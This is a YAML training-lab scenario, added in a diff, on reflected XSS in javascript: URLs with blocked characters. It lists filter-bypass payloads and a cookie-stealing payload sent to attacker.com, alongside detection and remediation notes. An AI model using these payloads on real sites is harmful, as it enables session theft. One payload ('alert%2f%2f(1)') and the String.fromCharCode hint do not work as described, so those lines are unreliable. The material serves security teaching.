@@ -1,0 +1,94 @@
+# Category: Cross-Site Scripting (XSS)
+name: "Reflected XSS in a JavaScript URL with some characters blocked"
+id: "xss-reflected-js-url-partial-001"
+category: "xss"
+subcategory: "reflected"
+difficulty: "expert"
+estimated_time: "60 minutes"
+
+description: |
+  This scenario covers reflected XSS where the input is reflected inside a
+  JavaScript URL (e.g., `<a href="javascript:USER_INPUT">`) and some characters
+  are blocked (e.g., parentheses, quotes). The attacker must use encoding,
+  template literals, or alternative event handlers to execute code.
+
+learning_objectives:
+  - Understand JavaScript URLs and their risks
+  - Bypass character blocklists using encoding
+  - Use `String.fromCharCode` or other methods to construct payloads
+  - Leverage alternative execution vectors
+
+tools:
+  - Burp Suite
+  - Browser developer tools
+
+prerequisites:
+  - Advanced understanding of JavaScript encoding
+  - Access to a vulnerable web application or lab
+
+steps:
+  - id: "step1"
+    phase: "reconnaissance"
+    action: "Identify blocked characters in JavaScript URL"
+    commands:
+      - "# Test with common characters: (), \", ', ;, ="
+      - "# Observe which are removed or encoded"
+    expected_output: "Blocked characters identified"
+    detection: "None"
+
+  - id: "step2"
+    phase: "exploitation"
+    action: "Craft payload using allowed characters only"
+    commands:
+      - "# Use String.fromCharCode to construct code:"
+      - "# Payload: javascript:alert%2f%2f(1) (using URI encoding)"
+      - "# Or: javascript:alert`1` (template literal, no parentheses)"
+      - "# Or: javascript:window.onerror=alert;throw'XSS'"
+    expected_output: "JavaScript alert executes"
+    detection: "Web server logs may show payload"
+
+  - id: "step3"
+    phase: "post_exploitation"
+    action: "Exfiltrate data"
+    commands:
+      - "# Payload: javascript:window.onerror=window.location='http://attacker.com/steal?cookie='+document.cookie;throw'X'"
+    expected_output: "Cookie sent to attacker"
+    detection: "Attacker server logs"
+
+compliance_controls:
+  - standard: "MITRE ATT&CK"
+    control: "T1189"
+    description: "Drive-by Compromise"
+  - standard: "OWASP"
+    control: "A03:2021"
+    description: "Injection"
+
+detection:
+  network_indicators:
+    - "Requests with encoded JavaScript payloads"
+  log_indicators:
+    - "Web server logs with unusual parameters"
+  endpoint_indicators:
+    - "None"
+
+remediation:
+  immediate:
+    - "Avoid using user input in JavaScript URLs"
+    - "Use a robust sanitizer that removes javascript: protocol"
+  long_term:
+    - "Implement a Content Security Policy"
+    - "Use a whitelist of allowed protocols"
+
+variables:
+  target_url: "http://example.com/page?param=PAYLOAD"
+
+assessment_questions:
+  - "What is a JavaScript URL and how is it exploited?"
+  - "How can you bypass character blocklists in XSS?"
+  - "What are some alternative ways to execute code without parentheses?"
+
+references:
+  - url: "https://owasp.org/www-community/attacks/xss/"
+    title: "OWASP XSS"
+  - url: "https://cheatsheetseries.owasp.org/cheatsheets/XSS_Filter_Evasion_Cheat_Sheet.html"
+    title: "XSS Filter Evasion"
